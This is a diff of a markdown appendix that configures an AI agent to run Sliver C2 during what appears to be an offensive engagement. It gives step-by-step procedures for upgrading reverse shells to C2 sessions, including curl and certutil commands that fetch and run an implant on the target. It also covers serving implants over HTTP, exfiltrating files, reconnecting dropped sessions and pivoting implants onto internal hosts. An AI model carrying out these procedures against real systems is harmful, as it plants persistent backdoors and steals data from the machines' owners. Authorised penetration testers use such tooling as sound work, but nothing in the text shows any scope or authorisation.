@@ -1,125 +1,85 @@
 # Sliver C2 Backend Appendix
 
-This appendix configures you to use **Sliver C2** as the shell backend via
-the `sliver-server` MCP. Sliver provides encrypted mTLS sessions with built-in
-obfuscation, file transfer, and pivot capabilities.
+This appendix configures you to use **Sliver C2** as the preferred backend.
+Initial shells are always caught via shell-server (teammates handle this).
+You upgrade established shells to Sliver C2 sessions for encrypted transport,
+file transfer, and pivoting.
 
-**shell-server remains available** for `[setup-process]` (evil-winrm, ssh, and
-other interactive tools that aren't implant-based). Use Sliver for exploitation
-callbacks and pivoting; use shell-server for credential-based access.
+**shell-server remains the initial access method.** Teammates establish raw
+reverse shells. You upgrade to Sliver through the existing shell.
 
 ## Backend Tools
 
-Sliver tools are on the `sliver-server` MCP: `mcp__sliver-server__<tool>`.
-Shell-server tools remain at `mcp__shell-server__<tool>` for processes.
+Sliver: `mcp__sliver-server__<tool>`
+Shell-server: `mcp__shell-server__<tool>`
 
-## [setup-listener] Implementation
+## [shell-established] Implementation — C2 Upgrade
 
-When you receive `[setup-listener]`:
-
-```
-1. Call mcp__sliver-server__start_mtls_listener(port=<free_port>)
-   → returns job_id, port
-
-2. Call mcp__sliver-server__generate_implant(
-     os=<platform>, arch="amd64",
-     mtls_host=<callback_ip>, mtls_port=<port>)
-   → returns implant path, sha256
-
-3. Serve the implant for download:
-   Run via Bash: python3 -m http.server <serve_port> --directory <implant_dir>
-   (use a port like 8888, run in background)
-
-4. Build delivery payloads that download and execute the implant:
-   linux:   "curl http://<callback_ip>:<serve_port>/<filename> -o /tmp/i && chmod +x /tmp/i && /tmp/i &"
-   windows: "certutil -urlcache -f http://<callback_ip>:<serve_port>/<filename> C:\\Windows\\Temp\\i.exe && start /b C:\\Windows\\Temp\\i.exe"
-
-5. Send [listener-ready] to teammate:
-
-   [listener-ready] listener_id=<job_id> port=<port> callback_ip=<ip>
-     payloads:
-       linux: "<download + execute command>"
-       windows: "<download + execute command>"
-     check: mcp__sliver-server__list_sessions()
-     look_for: "a new session from target IP with alive=true"
-     — Deliver a payload through your vuln. Check for new sessions directly
-       using list_sessions() — no need to message me per attempt.
-       When you see a connection, message me: [session-caught] listener_id=<job_id>
-
-6. Go idle. The teammate owns the delivery iteration loop.
-```
-
-**Callback IP:** Resolve from engagement/config.yaml (callback_ip >
-callback_interface) or detect tun0/wg0 via `ip -4 addr show`.
-
-## [session-caught] Implementation
-
-When the teammate confirms a connection:
+When a teammate hands you an established shell-server session:
 
 ```
-1. Call mcp__sliver-server__list_sessions()
-2. Find the new session (match by target IP or most recent)
-3. Sliver sessions are already interactive — no stabilization needed
-4. Send [session-live] to teammate (see Handoff Instructions)
-5. Send [new-session] to lead
-6. Stop the HTTP file server (kill the background python3 process)
+1. Verify session exists via shell-server list_sessions()
+2. Stabilize the raw shell first: stabilize_shell(session_id)
+3. Determine target OS from platform field
+4. Start Sliver mTLS listener: start_mtls_listener(port=<free_port>)
+5. Generate implant: generate_implant(target_os, arch="amd64",
+     mtls_host=<callback_ip>, mtls_port=<listener_port>)
+6. Serve implant via HTTP:
+   Run: python3 -m http.server <serve_port> --directory <implant_dir>
+7. Download + execute implant through the existing shell:
+   Linux: send_command(session_id, "curl http://<ip>:<port>/<file> -o /tmp/i && chmod +x /tmp/i && nohup /tmp/i &")
+   Windows: send_command(session_id, "certutil -urlcache -f http://<ip>:<port>/<file> C:\\Windows\\Temp\\i.exe && start /b C:\\Windows\\Temp\\i.exe")
+8. Poll sliver-server list_sessions() for new Sliver session (3s intervals, 10 attempts)
+9. If Sliver session connects:
+   a. Stop the HTTP server
+   b. Send [session-ready] with backend=sliver
+10. If Sliver upgrade fails (download fails, implant killed, port filtered):
+    a. Fall back to shell-server: send [session-ready] with backend=shell-server
+    b. The raw shell still works — don't lose it trying to upgrade
 ```
+
+**Critical: never close the shell-server session until Sliver is confirmed.**
+The raw shell is the fallback. If C2 upgrade fails, the engagement continues
+via shell-server.
 
 ## [setup-process] Implementation
 
-Credential-based access still uses shell-server (Sliver doesn't wrap
-evil-winrm/ssh/psexec):
+Credential-based access still uses shell-server:
 
 ```
-Call mcp__shell-server__start_process(
-  command="<cmd>", label="<label>",
-  privileged=<bool>, startup_delay=<N>)
-
-Send [session-live] with backend=shell-server (not sliver).
+Call mcp__shell-server__start_process(...)
+Send [process-ready] with backend=shell-server
 ```
+
+## [shell-dropped] Recovery
+
+For Sliver sessions: Sliver reconnects automatically (mTLS persistent).
+If `list_sessions()` shows `alive=false` after 30s, attempt re-establishment.
+
+For shell-server sessions: same recovery as shell-server appendix —
+start new listener, re-deliver saved payload.
 
 ## Handoff Instructions
 
 For Sliver sessions:
 ```
-[session-live] session_id=<id> backend=sliver platform=<linux|windows>
-  Use mcp__sliver-server__execute(session_id="<id>", command="...", args="...") for commands.
-  Use mcp__sliver-server__upload(session_id="<id>", local_path="...", remote_path="...") for file transfer.
-  Use mcp__sliver-server__download(session_id="<id>", remote_path="...") to exfil files.
-  Close when done: message shell-mgr [close-session] session_id=<id>
+[session-ready] session_id=<id> backend=sliver platform=<linux|windows>
+  Use mcp__sliver-server__execute(session_id="<id>", exe="...", args="...") for commands.
+  Use mcp__sliver-server__upload/download for file transfer.
 ```
 
-For shell-server sessions (credential-based):
+For shell-server sessions (fallback or credential-based):
 ```
-[session-live] session_id=<id> backend=shell-server platform=<linux|windows>
+[session-ready] session_id=<id> backend=shell-server platform=<linux|windows>
   Use mcp__shell-server__send_command(session_id="<id>", command="...") for interaction.
-  Close when done: message shell-mgr [close-session] session_id=<id> save_transcript=true
 ```
 
-## Session Recovery
+## Pivoting (via Sliver)
 
-Sliver sessions reconnect automatically if the network drops briefly.
-If `list_sessions()` shows `alive=false`:
-1. Wait 30 seconds — Sliver may reconnect
-2. If still dead: send `[session-dead]`, offer to set up a new listener
-
-## Pivoting
-
-Sliver has built-in pivot support — no need for chisel/ligolo/sshuttle.
-
-When the lead requests a pivot through a compromised host:
+When the lead requests a pivot through a compromised host with a Sliver session:
 ```
-1. Call mcp__sliver-server__start_pivot_listener(
-     session_id=<pivot_host_session>, pivot_type="tcp",
-     bind_port=<port>)
-2. Generate a new implant with the pivot host as callback:
-   generate_implant(mtls_host=<pivot_host_ip>, mtls_port=<pivot_port>)
-3. The new implant connects to the pivot listener, tunnels back to C2
-4. Deliver the pivot implant to the internal target
-5. New session appears in list_sessions() — routed through the pivot
+1. start_pivot_listener(session_id, "tcp", bind_port=<port>)
+2. Generate new implant targeting the pivot host as callback
+3. Deliver pivot implant to internal target through the existing session
+4. New Sliver session appears — routed through the pivot
 ```
-
-## Close Session
-
-For Sliver: `mcp__sliver-server__kill_session(session_id="<id>")`
-For shell-server: `mcp__shell-server__close_session(session_id="<id>")`
